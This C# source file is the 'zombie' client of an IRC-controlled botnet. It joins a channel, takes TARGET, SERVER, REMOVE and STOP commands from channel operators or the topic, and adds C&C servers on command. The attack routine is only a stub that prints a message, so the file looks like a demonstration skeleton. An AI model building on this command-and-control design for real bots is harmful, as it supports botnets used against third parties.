using System;
using System.Collections.Generic;
using System.Threading;
using Meebey.SmartIrc4net;

namespace Parrot4Net
{
    public class Zombie
    {
        private static IrcClient irc;
        private static bool ircenabled = true;
        private static Thread irclisten;
        private static HashSet<string> OpList;
        private static int ircport;
        private static int ircalterport;
        private static string ircchannel;
        private static SortedSet<String> serverlist = new SortedSet<string>();

        public Zombie(string ircserver, int ircport, int ircalterport, string ircchannel) {
            irc = new IrcClient();
            irc.OnConnected += IrcConnected;
            irc.OnReadLine += OnReadLine;
            irc.OnChannelMessage += OnMessage;
            irc.OnOp += OnOp;
            irc.OnDeop += OnDeOp;
            irc.OnPart += OnPart;
            irc.OnNickChange += OnNickChange;
            irc.OnTopic += OnTopic;
            irc.OnTopicChange += OnTopicChange;
            irc.OnQuit += OnQuit;
            irc.OnKick += OnKick;
            irc.OnDisconnected += IrcDisconnected;
            irc.OnNames += OnNames;
            irc.AutoRejoinOnKick = true;
            irc.AutoRejoin = true;
            serverlist.Add(ircserver);
            Zombie.ircport = ircport;
            Zombie.ircchannel = ircchannel;
            Zombie.ircalterport = ircalterport;
        }

        public void ConnectAndListen() {
            try
            {
                irc.Connect(new List<string>(serverlist).ToArray(), ircport);
                irc.Login("HIR_" + Utils.RandomString(), "Hirata Zombie", 0, "IRCHIR");
                irc.RfcJoin(ircchannel);
                // Spawn a thread to handle the listen.
                irclisten = new Thread(new ThreadStart(IrcListenThread));
                irclisten.Start();
            }
            catch (ConnectionException e)
            {
                try {
                    irc.Connect(new List<string>(serverlist).ToArray(), ircalterport);
                    irc.Login("HIR_" + Utils.RandomString(), "Hirata Zombie", 0, "IRCHIR");
                    irc.RfcJoin(ircchannel);
                    // Spawn a thread to handle the listen.
                    irclisten = new Thread(new ThreadStart(IrcListenThread));
                    irclisten.Start();
                }
                catch
                {
                    Console.WriteLine("couldn't connect! Reason: " + e.Message);
                    Exit();
                }
            }
        }

        private void IrcConnected(object sender, EventArgs e)
        {
            Console.WriteLine("Connected...");
        }

        private void IrcDisconnected(object sender, EventArgs e)
        {
            Console.WriteLine("Disconnected...");
            try
            {
                irc.Connect(new List<string>(serverlist).ToArray(), ircport);
                irc.Login("HIR_" + Utils.RandomString(), "Hirata Zombie", 0, "IRCHIR");
                irc.RfcJoin(ircchannel);
            }
            catch
            {
                try {
                    irc.Connect(new List<string>(serverlist).ToArray(), ircalterport);
                    irc.Login("HIR_" + Utils.RandomString(), "Hirata Zombie", 0, "IRCHIR");
                    irc.RfcJoin(ircchannel);
                }
                catch { }
            }
        }

        private void OnReadLine(object sender, ReadLineEventArgs e)
        {
            string command = e.Line.Split(' ')[0];
            string second = e.Line.Split(' ')[1];
            if (command.Equals("PING"))
            {
                irc.WriteLine("PONG " + second, Priority.Critical);
            }
            else if (second.Equals("422") || second.Equals("376")) // 422: motd missing // 376: end of motd
            {
                if (OpList != null) OpList.Clear();
                if (OpList == null) OpList = new HashSet<string>();
            }
            else if (second == "TOPIC") { } 
            else
            {
                Console.WriteLine(">>> " + e.Line);
            }
        }

        private void OnNames(object sender, NamesEventArgs e)
        {
            //Got the list of everybody...
            if (OpList != null)
            {
                OpList.Clear();
            }
            else
            {
                if (OpList == null) OpList = new HashSet<string>();
            }

            foreach (string user in e.UserList)
            {
                if (user.StartsWith("@") || user.StartsWith("&") || user.StartsWith("~"))
                {
                    //Add operators to our operator set.
                    OpList.Add(user.Substring(1));
                }
            }
        }

        private void OnOp(object sender, OpEventArgs e)
        {
            //Someone became an operator
            if (OpList == null) OpList = new HashSet<string>();
            if (!OpList.Contains(e.Whom))
            {
                //Add it if he's not already there.
                OpList.Add(e.Whom);
            }
        }

        private void OnDeOp(object sender, DeopEventArgs e)
        {
            //Someone is not an operator anymore
            if (OpList == null) OpList = new HashSet<string>();
            if (OpList.Contains(e.Whom))
            {
                //Remove him if he's there.
                OpList.Remove(e.Whom);
            }
        }

        private void OnPart(object sender, PartEventArgs e)
        {
            // Same as with quit
            if (OpList == null) OpList = new HashSet<string>();
            if (OpList.Contains(e.Who))
            {
                //Remove him if he's there.
                OpList.Remove(e.Who);
            }
        }

        private void OnQuit(object sender, QuitEventArgs e)
        {
            if (OpList == null) OpList = new HashSet<string>();
            if (OpList.Contains(e.Who))
            {
                //Remove him if he's there.
                OpList.Remove(e.Who);
            }
        }

        private void OnKick(object sender, KickEventArgs e)
        {
            // Similar to with Quit, but he WAS kicked (uses Whom)
            if (OpList == null) OpList = new HashSet<string>();
            if (OpList.Contains(e.Whom))
            {
                //Remove him if he's there.
                OpList.Remove(e.Whom);
            }
        }


        private void OnNickChange(object sender, NickChangeEventArgs e)
        {
            if (OpList != null)
            {
                //Keep our set up to date.
                if (OpList.Contains(e.OldNickname))
                {
                    OpList.Remove(e.OldNickname);
                }
                if (!OpList.Contains(e.NewNickname))
                {
                    OpList.Add(e.NewNickname);
                }
            }
        }

        private void OnMessage(object sender, IrcEventArgs e)
        {
            Console.WriteLine("Message: " + e.Data.Message);
            //authenticate
            if (OpList != null && OpList.Contains(e.Data.Nick))
            {
                String[] pars = e.Data.Message.Split(' ');
                Console.WriteLine("Controlled by " + e.Data.Nick);
                Console.WriteLine("Control command: " + e.Data.Message);
                ParseCommand(pars);
            }
        }

        private void OnTopic(object sender, TopicEventArgs e)
        {
            String[] pars = e.Topic.Split(' ');
            Console.WriteLine("Control command: " + e.Topic);
            ParseCommand(pars);
        }

        private void OnTopicChange(object sender, TopicChangeEventArgs e)
        {
            String[] pars = e.NewTopic.Split(' ');
            Console.WriteLine("Control command: " + e.NewTopic);
            ParseCommand(pars);
        }

        private void IrcListenThread()
        {
            while (ircenabled)
            {
                irc.Listen();
            }
        }

        private static void Exit()
        {
            // we are done, lets exit...
            Console.WriteLine("Exiting...");
            Environment.Exit(0);
        }

        private void ParseCommand(String[] pars) {
            string control = pars[0];
            string value = (pars.Length>1)?(pars[1]):("");
            switch (control) {
                case "TARGET":
                    if (value != "") {
                        Attack(value);
                    }
                    break;
                case "SERVER": AddServer(value);  break;
                case "REMOVE": RemoveServer(value); break;
                case "STOP": Stop();  break;
            }
        }

        private void Attack(string target) {
            Console.WriteLine("***************Attacking " + target + "***************");
            Console.WriteLine();
        }

        private void Stop() {
            Console.WriteLine("***************Stopped attacking***************");
            Console.WriteLine();
        }

        private void AddServer(string value) {
            serverlist.Add(value);
            Console.WriteLine("***************Adding a new C&C***************");
            Console.WriteLine();
        }

        private void RemoveServer(string value)
        {
            serverlist.Remove(value);
            Console.WriteLine("***************Removing a C&C***************");
            Console.WriteLine();
        }
    }
}
